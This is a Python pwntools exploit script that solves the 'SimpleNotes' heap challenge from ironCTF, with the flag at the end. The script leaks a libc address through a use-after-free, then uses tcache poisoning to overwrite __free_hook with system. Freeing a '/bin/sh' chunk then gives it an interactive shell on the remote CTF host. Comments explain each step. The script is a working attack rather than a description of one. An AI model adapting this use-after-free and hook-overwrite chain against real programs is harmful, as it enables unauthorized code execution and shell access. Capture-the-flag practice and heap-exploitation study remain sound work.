from pwn import *

binary_name = "SimpleNotes"
exe  = ELF(binary_name, checksec=True)
libc = ELF("libc.so.6", checksec=False)
context.binary = exe

ru  = lambda *x, **y: r.recvuntil(*x, **y)
rl  = lambda *x, **y: r.recvline(*x, **y)
rc  = lambda *x, **y: r.recv(*x, **y)
sla = lambda *x, **y: r.sendlineafter(*x, **y)
sa  = lambda *x, **y: r.sendafter(*x, **y)
sl  = lambda *x, **y: r.sendline(*x, **y)
sn  = lambda *x, **y: r.send(*x, **y)

if args.REMOTE:
	r = connect("pwn.1nf1n1ty.team",32229 ) 
elif args.GDB:
	r = gdb.debug(f"debug_dir/{binary_name}", """
		c
	""", aslr=False)
else:
	r = process(f"debug_dir/{binary_name}")

def add_note(idx, size, note):
	r.sendlineafter(b">> ", b"1")
	r.sendlineafter(b": ", str(idx).encode())
	r.sendlineafter(b": ", str(size).encode())
	r.sendlineafter(b": ", note)
def edit_note(id, size, pay):
	r.sendlineafter(b'>> ', b'2')
	r.sendlineafter(b'Enter the id of note: ', str(id).encode())
	r.sendlineafter(b'Enter the size of note: ', str(size).encode())
	r.sendafter(b'Enter the note: ', pay)

def delete_note(id):
    r.sendlineafter(b'>> ', b'3')
    r.sendlineafter(b'Enter the id of note: ', str(id).encode())

def read_note(id):
    r.sendlineafter(b'>> ', b'4')
    r.sendlineafter(b'Enter the id of note: ', str(id).encode())

add_note(0, 0x500, b"leak")
add_note(1, 0x20, b"AAAAAAA")
add_note(2, 0x20, b"BBBBBBBBB")
delete_note(0)
read_note(0)
libc_leak = u64(rl().strip()+b"\x00\x00")
libc.address= libc_leak - 0x3ebca0

success(f"libc leak {hex(libc.address)}")
# a linked list will be created with the list of pointers of the freed chunks
# tcachebins
# 0x110 [  2]: 0x555555a02880 —▸ 0x555555a02770 ◂— 0x0
# these values are called fd, they are the second qword of the chunk and indicate the next
# we will overwrite the fd of our second chunk with free_hook

delete_note(1)
delete_note(2)
edit_note(2, 0x20, p64(libc.sym.__free_hook))

# subsequently, I will create a chunk of the same size as the one whose fd I overwrote
# this fd will be the position where I will write
# so in the second allocation below, I will write free_hook (fd overwritten with the uaf) with the address of system
add_note(3, 0x20, b"/bin/sh\x00")  
add_note(4, 0x20, p64(libc.sym.system))
delete_note(3)
r.interactive()
# ironCTF{Lets_g00_m4ll0c_y0ur_w4y_t0_5h311}
